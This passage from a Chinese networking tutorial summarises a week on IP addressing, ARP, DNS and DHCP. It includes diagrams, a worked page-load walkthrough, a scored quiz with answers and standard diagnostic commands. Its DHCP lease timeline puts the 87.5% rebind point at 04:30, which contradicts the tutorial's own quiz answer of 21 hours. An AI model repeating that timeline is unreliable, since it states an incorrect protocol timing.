class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss">浏览器缓存 (几分钟)<br>    ↓<br>操作系统缓存 (根据TTL)<br>    ↓<br>路由器缓存 (根据TTL)<br>    ↓<br>本地DNS服务器缓存 (根据TTL)<br>    ↓<br>权威DNS服务器 (真实数据源)<br></code></pre></td></tr></table></figure><h3 id="6-DHCP协议">6. DHCP协议</h3><p><strong>DORA四次握手</strong>：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs abnf">D - Discover   客户端广播：<span class="hljs-string">&quot;有DHCP服务器吗？&quot;</span><br>O - Offer      服务器响应：<span class="hljs-string">&quot;这里有个IP：192.168.1.100&quot;</span><br>R - Request    客户端广播：<span class="hljs-string">&quot;我要192.168.1.100&quot;</span><br>A - Ack        服务器确认：<span class="hljs-string">&quot;好的，分配给你了！&quot;</span><br><br>时间线：<br><span class="hljs-attribute">t</span><span class="hljs-operator">=</span><span class="hljs-number">0</span>ms    客户端发送Discover<br><span class="hljs-attribute">t</span><span class="hljs-operator">=</span><span class="hljs-number">10</span>ms   服务器响应Offer<br><span class="hljs-attribute">t</span><span class="hljs-operator">=</span><span class="hljs-number">15</span>ms   客户端发送Request<br><span class="hljs-attribute">t</span><span class="hljs-operator">=</span><span class="hljs-number">20</span>ms   服务器发送Ack<br>         ✅ 客户端配置完成，可以上网<br></code></pre></td></tr></table></figure><p><strong>DHCP配置内容</strong>：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dns">必需配置：<br>├── IP地址          <span class="hljs-number">192.168.1.100</span><br>├── 子网掩码        <span class="hljs-number">255.255.255.0</span><br>└── 租约时间        <span class="hljs-number">86400</span>秒 (<span class="hljs-number">24</span>小时)<br><br>可选配置：<br>├── 默认网关        <span class="hljs-number">192.168.1.1</span><br>├── DNS服务器       <span class="hljs-number">8.8.8.8</span>, <span class="hljs-number">8.8.4.4</span><br>├── 域名            example.com<br>└── 其他参数        NTP服务器、WINS服务器等<br></code></pre></td></tr></table></figure><p><strong>租约时间管理</strong>：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs subunit">租约周期：24小时 (86400秒)<br><br>时间点：<br>0%        开始时间：2024<span class="hljs-string">-01</span><span class="hljs-string">-15</span> 10:00:00<br>          ↓<br>50%       T1续约：  2024<span class="hljs-string">-01</span><span class="hljs-string">-15</span> 22:00:00<br>          (直接联系原DHCP服务器)<br>          ↓<br>87.5%     T2重绑：  2024<span class="hljs-string">-01</span><span class="hljs-string">-16</span> 04:30:00<br>          (广播寻找任何DHCP服务器)<br>          ↓<br>100%      到期时间：2024<span class="hljs-string">-01</span><span class="hljs-string">-16</span> 10:00:00<br>          (释放IP，重新DORA)<br></code></pre></td></tr></table></figure><hr><h2 id="🔗-知识串联">🔗 知识串联</h2><p>让我们把这一周的知识串联起来，看看它们如何协同工作：</p><h3 id="场景：你的电脑如何访问-www-baidu-com">场景：你的电脑如何访问 <a href="http://www.baidu.com">www.baidu.com</a></h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs dns">步骤<span class="hljs-number">1</span>：获取网络配置 (DHCP)<br>─────────────────────────────────<br>开机 → DHCP DORA过程<br>     ↓<br>获得配置：<br>- IP地址：<span class="hljs-number">192.168.1.100</span><br>- 子网掩码：<span class="hljs-number">255.255.255.0</span><br>- 网关：<span class="hljs-number">192.168.1.1</span><br>- DNS：<span class="hljs-number">8.8.8.8</span><br><br>步骤<span class="hljs-number">2</span>：DNS域名解析<br>─────────────────────────────────<br>浏览器输入：www.baidu.com<br>     ↓<br>查询本地DNS缓存<br>     ↓ (未命中)<br>本地DNS → 递归查询<br>     ↓<br>得到IP：<span class="hljs-number">110.242.68.66</span><br><br>步骤<span class="hljs-number">3</span>：判断是否同一子网<br>─────────────────────────────────<br>目标IP：<span class="hljs-number">110.242.68.66</span><br>本机IP：<span class="hljs-number">192.168.1.100</span>/<span class="hljs-number">24</span><br>本机网络：<span class="hljs-number">192.168.1.0</span><br><br><span class="hljs-number">110.242.68.66</span> ∉ <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br>     ↓<br>需要通过网关转发<br><br>步骤<span class="hljs-number">4</span>：ARP获取网关MAC地址<br>─────────────────────────────────<br>需要发送给：<span class="hljs-number">192.168.1.1</span>（网关）<br>     ↓<br>查询ARP缓存<br>     ↓ (未命中)<br>广播ARP请求：&quot;<span class="hljs-number">192.168.1.1</span>的MAC是什么？&quot;<br>     ↓<br>收到ARP响应：&quot;MAC是aa:bb:cc:dd:ee:ff&quot;<br>     ↓<br>更新ARP缓存<br><br>步骤<span class="hljs-number">5</span>：封装数据包并发送<br>─────────────────────────────────<br>应用层：HTTP请求 GET / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br>     ↓<br>传输层：TCP段 (源端口:<span class="hljs-number">54321</span> → 目标端口:<span class="hljs-number">80</span>)<br>     ↓<br>网络层：IP包<br>        源IP: <span class="hljs-number">192.168.1.100</span><br>        目标IP: <span class="hljs-number">110.242.68.66</span><br>     ↓<br>链路层：以太网帧<br>        源MAC: 你的电脑MAC<br>        目标MAC: aa:bb:cc:dd:ee:ff (网关MAC)<br>     ↓<br>发送到网关<br><br>步骤<span class="hljs-number">6</span>：网关转发<br>─────────────────────────────────<br>网关收到数据包<br>     ↓<br>查看目标IP：<span class="hljs-number">110.242.68.66</span><br>     ↓<br>查询路由表，找到下一跳<br>     ↓<br>转发给运营商路由器<br>     ↓<br>... 经过多个路由器 ...<br>     ↓<br>到达百度服务器<br><br>步骤<span class="hljs-number">7</span>：接收响应<br>─────────────────────────────────<br>百度服务器处理请求<br>     ↓<br>返回HTTP响应<br>     ↓<br>... 原路返回 ...<br>     ↓<br>到达你的电脑<br>     ↓<br>浏览器显示网页 ✅<br></code></pre></td></tr></table></figure><h3 id="完整的网络层协议栈">完整的网络层协议栈</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌────────────────────────────────────────┐<br>│         应用层                          │<br>│    HTTP、FTP、SMTP、DNS                │<br>├────────────────────────────────────────┤<br>│         传输层                          │<br>│    TCP (端口)、UDP (端口)              │<br>├────────────────────────────────────────┤<br>│         网络层                          │<br>│    IP (地址)、ICMP、ARP                │<br>├────────────────────────────────────────┤<br>│         链路层                          │<br>│    以太网 (MAC地址)、WiFi              │<br>├────────────────────────────────────────┤<br>│         物理层                          │<br>│    电信号、光信号、无线电波            │<br>└────────────────────────────────────────┘<br></code></pre></td></tr></table></figure><hr><h2 id="💻-综合实战项目">💻 综合实战项目</h2><h3 id="项目：网络配置诊断工具">项目：网络配置诊断工具</h3><p>创建一个综合工具，整合本周所学知识：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 综合诊断</span><br>python week02_network_diagnostic.py --full<br><br><span class="hljs-comment"># 单项检查</span><br>python week02_network_diagnostic.py --check-ip<br>python week02_network_diagnostic.py --check-dns<br>python week02_network_diagnostic.py --check-gateway<br></code></pre></td></tr></table></figure><p><strong>项目代码</strong>：见 <code>code/week02/week02_network_diagnostic.py</code></p><p><strong>功能清单</strong>：</p><ol><li>✅ 显示本机IP配置（IP、掩码、网关、DNS）</li><li>✅ 分析IP地址类型（公有/私有、类别）</li><li>✅ 计算子网信息（网络地址、广播地址、可用主机）</li><li>✅ 查看ARP缓存</li><li>✅ 扫描网关可达性</li><li>✅ 测试DNS解析</li><li>✅ 显示DHCP租约信息</li><li>✅ 检查常用端口</li><li>✅ 网络连通性测试</li><li>✅ 生成诊断报告</li></ol><hr><h2 id="📝-知识测验">📝 知识测验</h2><h3 id="基础题（每题10分）">基础题（每题10分）</h3><p><strong>1. IP地址 172.16.50.100 属于哪一类？是公有IP还是私有IP？</strong></p><details><summary>点击查看答案</summary><ul><li>类别：B类（第一个字节172，10xxxxxx开头）</li><li>类型：私有IP（172.16.0.0/12 是B类私有地址范围）</li></ul></details><p><strong>2. 子网掩码 255.255.255.192 对应的CIDR是多少？有多少个可用主机？</strong></p><details><summary>点击查看答案</summary><ul><li>CIDR：/26</li><li>计算：255.255.255.192 = 11111111.11111111.11111111.11000000<br>共有26个1，所以是/26</li><li>可用主机数：2^(32-26) - 2 = 2^6 - 2 = 64 - 2 = 62个</li></ul></details><p><strong>3. MAC地址 00:50:56:12:34:56 是哪个厂商的设备？</strong></p><details><summary>点击查看答案</summary><ul><li>厂商：VMware</li><li>判断：OUI前缀 00:50:56 属于VMware</li></ul></details><p><strong>4. 端口号 3306 通常用于什么服务？</strong></p><details><summary>点击查看答案</summary><ul><li>服务：MySQL数据库</li><li>默认端口：3306/tcp</li></ul></details><p><strong>5. DNS的A记录和CNAME记录有什么区别？</strong></p><details><summary>点击查看答案</summary><ul><li><p>A记录：直接指向IPv4地址<br>示例：<a href="http://www.example.com">www.example.com</a> → 93.184.216.34</p></li><li><p>CNAME记录：指向另一个域名（别名）<br>示例：<a href="http://blog.example.com">blog.example.com</a> → <a href="http://www.example.com">www.example.com</a></p></li><li><p>区别：</p><ol><li>A记录直接解析，CNAME需要再次查询</li><li>根域名只能用A记录</li><li>CNAME不能与其他记录共存</li></ol></li></ul></details><p><strong>6. DHCP的T1和T2分别是租约时长的多少？</strong></p><details><summary>点击查看答案</summary><ul><li>T1（续约时间）：租约时长的 50%</li><li>T2（重绑时间）：租约时长的 87.5%</li></ul><p>示例：租期24小时</p><ul><li>T1 = 12小时（直接联系原服务器）</li><li>T2 = 21小时（广播寻找任何服务器）</li><li>到期 = 24小时（释放IP）</li></ul></details><h3 id="进阶题（每题15分）">进阶题（每题15分）</h3><p><strong>7. 请计算网络 192.168.10.0/24 划分为8个等大小子网的结果。</strong></p><details><summary>点击查看答案</summary><p>划分为8个子网，需要3位（2^3=8）<br>新的子网掩码：/24 + 3 = /27<br>子网掩码：255.255.255.224</p><p>8个子网：</p><ol><li>192.168.10.0/27   (192.168.10.1 - 192.168.10.30)</li><li>192.168.10.32/27  (192.168.10.33 - 192.168.10.62)</li><li>192.168.10.64/27  (192.168.10.65 - 192.168.10.94)</li><li>192.168.10.96/27  (192.168.10.97 - 192.168.10.126)</li><li>192.168.10.128/27 (192.168.10.129 - 192.168.10.158)</li><li>192.168.10.160/27 (192.168.10.161 - 192.168.10.190)</li><li>192.168.10.192/27 (192.168.10.193 - 192.168.10.222)</li><li>192.168.10.224/27 (192.168.10.225 - 192.168.10.254)</li></ol><p>每个子网：30个可用主机</p></details><p><strong>8. 描述完整的ARP请求和响应过程（包括MAC地址和IP地址）。</strong></p><details><summary>点击查看答案</summary><p>场景：主机A要与主机B通信</p><p>已知信息：</p><ul><li>主机A：IP=192.168.1.10, MAC=aa:bb:cc:dd:ee:ff</li><li>主机B：IP=192.168.1.20, MAC=11:22:33:44:55:66</li></ul><p>步骤：</p><ol><li><p>ARP请求（广播）：</p><ul><li>源MAC：aa:bb:cc:dd:ee:ff</li><li>目标MAC：ff:ff:ff:ff:ff:ff（广播）</li><li>源IP：192.168.1.10</li><li>目标IP：192.168.1.20</li><li>询问：“谁是192.168.1.20？请告诉192.168.1.10”</li></ul></li><li><p>ARP响应（单播）：</p><ul><li>源MAC：11:22:33:44:55:66</li><li>目标MAC：aa:bb:cc:dd:ee:ff</li><li>源IP：192.168.1.20</li><li>目标IP：192.168.1.10</li><li>回答：“我是192.168.1.20，我的MAC是11:22:33:44:55:66”</li></ul></li><li><p>主机A更新ARP缓存表：<br>192.168.1.20 → 11:22:33:44:55:66</p></li><li><p>后续通信直接使用缓存的MAC地址</p></li></ol></details><p><strong>9. 解释DNS递归查询和迭代查询的区别，并说明哪里用递归哪里用迭代。</strong></p><details><summary>点击查看答案</summary><p>递归查询（Recursive Query）：</p><ul><li>定义：查询者发出请求后，DNS服务器负责完成整个查询</li><li>特点：“帮我查到结果再告诉我”</li><li>返回：最终答案或错误</li></ul><p>迭代查询（Iterative Query）：</p><ul><li>定义：DNS服务器只返回下一步应该查询的服务器地址</li><li>特点：“我不知道，但你可以去问XX服务器”</li><li>返回：推荐查询的服务器地址</li></ul><p>实际应用：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">客户端 → 本地DNS   【递归查询】<br>         ↓<br>本地DNS → 根DNS     【迭代查询】<br>         ↓<br>本地DNS → TLD<span class="hljs-built_in"> DNS </span>  【迭代查询】<br>         ↓<br>本地DNS → 权威DNS   【迭代查询】<br>         ↓<br>本地DNS → 客户端    【递归查询】<br></code></pre></td></tr></table></figure><p>为什么这样设计？</p><ul><li>客户端用递归：简单，不需要多次查询</li><li>服务器间用迭代：减轻单个服务器负担，避免递归导致的深度过深</li></ul></details><p><strong>10. 如果DHCP服务器在另一个子网，如何实现DHCP服务？</strong></p><details><summary>点击查看答案</summary><p>问题：DHCP使用广播，广播无法跨越路由器</p><p>解决方案：<strong>DHCP Relay（中继代理）</strong></p><p>工作原理：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[子网1: 192.168.1.0/24]</span><br>    ↓ 客户端广播Discover<br><span class="hljs-string">[路由器 - DHCP Relay]</span><br>    ↓ 单播转发到DHCP服务器<br><span class="hljs-string">[子网2: 192.168.2.0/24 - DHCP服务器]</span><br></code></pre></td></tr></table></figure><p>详细流程：</p><ol><li>客户端在子网1广播DHCP Discover</li><li>路由器（配置为DHCP Relay）收到</li><li>路由器修改报文：<ul><li>源IP改为路由器接口IP (192.168.1.1)</li><li>目标IP改为DHCP服务器IP (192.168.2.100)，单播</li><li>Gateway IP字段填入192.168.1.1</li><li>Hops字段加1</li></ul></li><li>DHCP服务器看到Gateway IP，知道客户端在子网1</li><li>从子网1的地址池分配IP</li><li>服务器单播响应给路由器</li><li>路由器转发响应给客户端</li></ol><p>配置示例（Cisco）：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">interface</span> GigabitEthernet0/<span class="hljs-number">0</span><br> <span class="hljs-attribute">ip</span> address <span class="hljs-number">192.168.1.1</span> <span class="hljs-number">255.255.255.0</span><br> <span class="hljs-attribute">ip</span> helper-address <span class="hljs-number">192.168.2.100</span><br></code></pre></td></tr></table></figure></details><h3 id="计分标准">计分标准</h3><ul><li>90-100分：优秀，完全掌握本周内容</li><li>75-89分：良好，大部分知识点已掌握</li><li>60-74分：及格，基础知识掌握，需加强练习</li><li>60分以下：需要重新学习本周内容</li></ul><hr><h2 id="🎓-实践建议">🎓 实践建议</h2><h3 id="1-动手实验">1. 动手实验</h3><p><strong>必做实验</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">□ 使用ipconfig/ifconfig查看本机网络配置<br>□ 计算自己所在网络的子网信息<br>□ 查看并分析ARP缓存表<br>□ 使用nslookup/dig查询DNS<br>□ 释放并重新获取DHCP地址<br>□ 扫描局域网内的活跃主机<br></code></pre></td></tr></table></figure><p><strong>选做实验</strong>：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">□ 搭建简单的DHCP服务器（虚拟机）<br>□ 配置DNS服务器（<span class="hljs-keyword">bind9）</span><br><span class="hljs-keyword"></span>□ 使用Wireshark抓包分析DHCP过程<br>□ 编写子网划分计算器<br>□ 实现简单的ARP欺骗检测<br></code></pre></td></tr></table></figure><h3 id="2-工具使用">2. 工具使用</h3><p><strong>命令行工具</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Windows</span><br>ipconfig /all          <span class="hljs-comment"># 查看详细网络配置</span><br>ipconfig /displaydns   <span class="hljs-comment"># 查看DNS缓存</span><br>arp -a                 <span class="hljs-comment"># 查看ARP缓存</span><br>nslookup www.baidu.com <span class="hljs-comment"># DNS查询</span><br>netstat -an            <span class="hljs-comment"># 查看端口状态</span><br><br><span class="hljs-comment"># Linux/Mac</span><br>ifconfig / ip addr     <span class="hljs-comment"># 查看网络配置</span><br>arp -n                 <span class="hljs-comment"># 查看ARP缓存</span><br>dig www.baidu.com      <span class="hljs-comment"># DNS查询</span><br>netstat -tuln          <span class="hljs-comment"># 查看监听端口</span><br>ss -tuln               <span class="hljs-comment"># 更快的端口查看</span><br></code></pre></td></tr></table></figure><p><strong>图形化工具</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">- </span>Wireshark：抓包分析<br><span class="hljs-bullet">- </span>Advanced IP Scanner：网络扫描<br><span class="hljs-bullet">- </span>Angry IP Scanner：跨平台IP扫描<br><span class="hljs-bullet">- </span>Fiddler：HTTP抓包<br></code></pre></td></tr></table></figure><h3 id="3-延伸学习">3. 延伸学习</h3><p><strong>推荐阅读</strong>：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>. RFC <span class="hljs-number">791</span>  - IP协议规范<br><span class="hljs-attribute">2</span>. RFC <span class="hljs-number">826</span>  - ARP协议规范<br><span class="hljs-attribute">3</span>. RFC <span class="hljs-number">1918</span> - 私有IP地址分配<br><span class="hljs-attribute">4</span>. RFC <span class="hljs-number">1035</span> - DNS协议规范<br><span class="hljs-attribute">5</span>. RFC <span class="hljs-number">2131</span> - DHCP协议规范<br><span class="hljs-attribute">6</span>. RFC <span class="hljs-number">4632</span> - CIDR地址分配<br></code></pre></td></tr></table></figure><p><strong>推荐视频/课程</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">- </span>Wireshark网络分析教程<br><span class="hljs-bullet">- </span>子网划分实战演练<br><span class="hljs-bullet">- </span>DNS深入解析<br><span class="hljs-bullet">- </span>DHCP服务器搭建<br></code></pre></td></tr></table></figure><hr><h2 id="🚀-下周预告">🚀 下周预告</h2><p><strong>第三周：传输层协议详解</strong></p><p>我们将学习：</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">Day 15</span><span class="hljs-punctuation">:</span> <span class="hljs-string">TCP协议基础</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">TCP报文格式</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">TCP三次握手</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">TCP四次挥手</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">TCP状态机</span><br><br><span class="hljs-attribute">Day 16</span><span class="hljs-punctuation">:</span> <span class="hljs-string">TCP可靠传输</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">序列号和确认号</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">滑动窗口机制</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">流量控制</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">拥塞控制</span><br><br><span class="hljs-attribute">Day 17</span><span class="hljs-punctuation">:</span> <span class="hljs-string">UDP协议详解</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">UDP报文格式</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">UDP vs TCP对比</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">UDP应用场景</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">UDP编程实战</span><br><br><span class="hljs-attribute">Day 18</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Socket编程进阶</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">非阻塞Socket</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">Socket选项设置</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">多路复用（select/poll/epoll）</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">实战：聊天室服务器</span><br><br><span class="hljs-attribute">Day 19</span><span class="hljs-punctuation">:</span> <span class="hljs-string">HTTP协议基础</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">HTTP请求和响应</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">HTTP方法（GET/POST等）</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">HTTP状态码</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">Cookie和Session</span><br><br><span class="hljs-attribute">Day 20</span><span class="hljs-punctuation">:</span> <span class="hljs-string">HTTPS与安全</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">HTTPS工作原理</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">SSL/TLS握手</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">证书验证</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">中间人攻击防护</span><br><br><span class="hljs-attribute">Day 21</span><span class="hljs-punctuation">:</span> <span class="hljs-string">第三周总结</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">传输层协议综合复习</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">TCP/UDP深入对比</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">综合实战项目</span><br></code></pre></td></tr></table></figure><hr><h2 id="📊-学习进度追踪">📊 学习进度追踪</h2><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs arcade">第一周 ✅ 网络基础入门<br>├─ <span class="hljs-built_in">Day</span> <span class="hljs-number">1</span><span class="hljs-number">-7</span> 完成 ✅<br>└─ 周总结完成 ✅<br><br>第二周 ✅ 网络层深入<br>├─ <span class="hljs-built_in">Day</span> <span class="hljs-number">8</span>:  IP地址详解 ✅<br>├─ <span class="hljs-built_in">Day</span> <span class="hljs-number">9</span>:  子网划分 ✅<br>├─ <span class="hljs-built_in">Day</span> <span class="hljs-number">10</span>: MAC与ARP ✅<br>├─ <span class="hljs-built_in">Day</span> <span class="hljs-number">11</span>: 端口与Socket ✅<br>├─ <span class="hljs-built_in">Day</span> <span class="hljs-number">12</span>: DNS协议 ✅<br>├─ <span class="hljs-built_in">Day</span> <span class="hljs-number">13</span>: DHCP协议 ✅<br>└─ <span class="hljs-built_in">Day</span> <span class="hljs-number">14</span>: 周总结 ✅<br><br>第三周 ⏳ 传输层协议<br>└─ <span class="hljs-built_in">Day</span> <span class="hljs-number">15</span><span class="hljs-number">-21</span> 待学习<br><br>总进度：<span class="hljs-number">14</span>/<span class="hljs-number">180</span> 天 (<span class="hljs-number">7.8</span>%)<br></code></pre></td></tr></table></figure><hr><h2 id="✅-本周检查清单">✅ 本周检查清单</h2><p>在进入下一周之前，请确保：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs armasm">□ 理解<span class="hljs-built_in">IP</span>地址分类和私有<span class="hljs-built_in">IP</span>范围<br>□ 能够计算子网掩码和CIDR<br>□ 掌握子网划分的方法<br>□ 理解MAC地址结构和OUI<br>□ 掌握ARP工作原理<br>□ 熟悉常用端口号<br>□ 理解Socket编程基础<br>□ 掌握DNS查询流程<br>□ 理解DNS记录类型<br>□ 掌握DHCP DORA过程<br>□ 理解租约管理机制<br>□ 完成本周所有代码练习<br>□ 能够使用基本的网络诊断命令<br></code></pre></td></tr></table></figure><hr><h2 id="💬-学习心得">💬 学习心得</h2><p>在这里记录你的学习收获和疑问：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs markdown">本周最大收获：<br><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span 